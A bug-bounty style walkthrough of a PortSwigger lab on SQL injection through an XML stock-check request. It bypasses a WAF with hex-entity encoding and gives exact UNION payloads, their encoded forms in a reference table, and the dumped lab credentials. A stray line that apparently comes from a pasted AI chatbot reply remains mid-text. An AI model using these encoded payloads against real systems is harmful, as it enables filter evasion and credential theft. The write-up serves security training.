# 🎯 Bypassing Filters via XML Encoding to Perform SQL Injection for Bug Hunting with with BurpSuite

**WriteUp by Aditya Bhatt | Bug Bounty | SQL Injection | WAF Bypass | XML Encoding** <br/>

If you think traditional SQL injections are fading, let me remind you — they still live on, sometimes wearing new masks. In this lab, I encountered an SQL injection vulnerability **disguised behind XML-encoded data**, and the twist? It was gated by WAF filters. But as always — **where there's obfuscation, there's a way.**

Let’s dive deep into how I tackled the **“SQL Injection with filter bypass via XML encoding”** lab from PortSwigger and retrieved **admin creds** by slipping payloads past filters like a ghost through a wall.

![Cover](https://github.com/user-attachments/assets/d889e8f4-44b2-488a-9c08-2ad36a1b45c9) <br/>

---

## 🔍 Lab Premise

The lab presents a **stock check feature** vulnerable to **SQL injection**. Inputs are sent in **XML format**, and the response reflects query results — making **UNION attacks** viable. The goal is to dump admin creds from the `users` table and log in.

🧪 **Lab Link**: [Click here](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

---

## 🧬 Step-by-Step PoC Walkthrough

I’m walking you through the process with technical clarity and exact payloads used. This one is particularly fun if you like filter bypasses and dirty tricks.

Perfect — thanks for clarifying! Here’s the clean and complete write-up (Points 1–14), keeping it in your casual, meme-style tone and **reflecting that you sent the payloads one by one**, **not using concatenation**.

---

### 1. 🎯 Go to Lab

[Launch the lab](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding) → open any product → click **Check Stock**.
This triggers a POST request we’re about to bully.

![1](https://github.com/user-attachments/assets/c39969ca-03c3-4454-b29d-b32049643181) <br/>

Also, open any item and hit Check Stock.

![2](https://github.com/user-attachments/assets/24e5e2b7-c548-4125-93ff-d36471cd7059) <br/>

---

### 2. 🕵️‍♂️ Capture the Request

Turn Intercept **ON** in **Burp Proxy**, then click on **Check Stock**.
Send that intercepted request to **Repeater** (Ctrl + R). That’s our lab rat now.

![3](https://github.com/user-attachments/assets/a4ab47ef-ab03-47fd-b621-a0c1a051025b) <br/>

---

### 3. 🧠 Analyze the Payload

Request body looks like this:

```xml
<productId>1</productId>
<storeId>1</storeId>
```

![4](https://github.com/user-attachments/assets/055f08bb-926b-4b4f-86a5-e6a04675ed56) <br/>

We’re politely asking the server:

> “Yo, how much stock for product 1 in store 1?”

Also, I initially thought this was a **race condition lab** 😭

> brain: "is this an XXE with a race condition?"
> also brain: “no bro it literally says SQLi.”

Anyway, curious folks can check this fun race condition write-up I did:
[Race Condition Write-Up](https://infosecwriteups.com/bug-bounty-race-exploiting-race-conditions-for-infinite-discounts-a2cb2f233804)

---

### 4. 🧪 Basic Payload Check

Tried this in Burp Repeater:

```xml
<storeId>1+1</storeId>
```

![5](https://github.com/user-attachments/assets/c12e0dd9-7594-45f4-aa70-332a57451741) <br/>

Response showed the stock for Store 2.
So the input **is evaluated server-side** → we’ve got a working SQLi.

---

### 5. 🧱 Testing UNION

Tested this:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

![6](https://github.com/user-attachments/assets/ad7c81b4-63c7-4611-8b22-5abb7baba76d) <br/>

**Result:**
Blocked by a WAF / filter → classic "Attack Detected" response.

---

### 6. 🥷 WAF Bypass with Encoding

Time to sneak past it like a stealthy SQL ninja. 
You can use online encoders but I'll stick to BurpSuite Exstenstions only for this Lab.

---

### 7. 🧩 Installing Hackvertor

From Burp → BApp Store → install **Hackvertor**.
Life becomes easier.
![7](https://github.com/user-attachments/assets/d63a2612-e089-4ed0-b837-cc0bbedcbbb0) <br/>

---

### 8. ⚗️ Encoding the Payload

Highlighted the payload → right-click → **Extensions → Hackvertor → Encode → hex\_entities**

So:

```xml
1 UNION SELECT NULL
```

Becomes:

```
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;
```

![8](https://github.com/user-attachments/assets/fed37318-0166-4234-9ab7-6c8fd3798238) <br/>

Now send the Request.

![9](https://github.com/user-attachments/assets/13e24ca4-8aea-4523-8508-08cb27645b54) <br/>

WAF didn’t even blink 😎
Payload bypassed. Request accepted ✅

---

### 9. 🔍 Finding Number of Columns

Tried:

```xml
<storeId>1 UNION SELECT NULL,NULL</storeId>
```

→ Encoded it
→ Got an error.

Tried:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

→ Encoded it
→ **Worked.**

So: **only one column available**.

Now, We need username and password from the users table.
We can concatenate both or send them one by one.
In this lab, I will use the more patient approach.

Encode the payloads in Hackvertor.
![10](https://github.com/user-attachments/assets/2c30a350-d691-4269-a0c2-eac50b6adc63) <br/>

---

### 10. 🎯 Probing for Table Data

Sent this encoded payload:

```xml
<storeId>1 UNION SELECT username FROM users</storeId>
```

→ Encoded using Hackvertor → Send

![11](https://github.com/user-attachments/assets/962961c7-2e72-4201-b98e-5a8a773fe99f) <br/>

**Response:**
Returned **only usernames**. No WAF block. Progress!

---

### 11. 🔐 Extracting Passwords

Sent another one:

```xml
<storeId>1 UNION SELECT password FROM users</storeId>
```

→ Encoded and sent it.


**Boom — plain text passwords dumped.**
No concatenation used. Just sent `username` and `password` **separately**, one after the other.

![12](https://github.com/user-attachments/assets/1ebf767e-0891-4236-a76e-260e6a4f1e98) <br/>

---

### 12. 🧼 Clean Dump

Final dump from the two requests:

```text
administrator
carlos
wiener
```

```text
s6rp5gueo3d9kzd8n60f  
fv2kufmgu40f2kunj9nv  
3yp9a9yorq7rcbxrnm9l
```

Just chilling there like it’s totally normal 💀

---

### 13. 🧑‍💻 Admin Login

Logged in with:

```text
Username: administrator  
Password: s6rp5gueo3d9kzd8n60f
```

![13](https://github.com/user-attachments/assets/c557da90-e5e6-4aec-8419-ddb4e3a831cd) <br/>

And…

---

### 14. 🏁 Lab SOLVED

Got that sweet success banner. 🎉
WAF evaded. Data dumped. Mission complete.
Another one bites the dust 😎

![14](https://github.com/user-attachments/assets/847eef3e-ff13-4283-a57f-b55a6362f333) <br/>

---

## 🧠 Key Takeaways

* **WAFs aren’t bulletproof** — obfuscation via encoding is a powerful tool.
* Use **Hackvertor** when facing filters in **XML-based injection points**.
* If limited to a **single column**, try **concatenation** for effective data exfiltration.
* Always test edge cases like arithmetic ops (`1+1`) to verify injection viability.

---

## 🛠 Payload Reference

| Type                | Payload                                                                                                                                                                                                        |
| ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Arithmetic Probe    | `<storeId>1+1</storeId>`                                                                                                                                                                                       |
| Raw UNION (Blocked) | `<storeId>1 UNION SELECT NULL</storeId>`                                                                                                                                                                       |
| Hex Encoded UNION   | `&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;`                                                                                           |
| Username Dump       | `&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x66;&#x72;&#x6f;&#x6d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;` |
| Password Dump       | `&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x66;&#x72;&#x6f;&#x6d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;` |

---

## 📚 Read More

* 🔗 [Hackvertor Extension – PortSwigger](https://portswigger.net/bappstore/4c50fcf66fd44539ac89d692c76572d4)
* 🔐 [Race Conditions in Bug Bounties – My Article](https://infosecwriteups.com/bug-bounty-race-exploiting-race-conditions-for-infinite-discounts-a2cb2f233804)
* 📖 [PortSwigger Web Security Academy – SQLi Labs](https://portswigger.net/web-security/sql-injection)

---
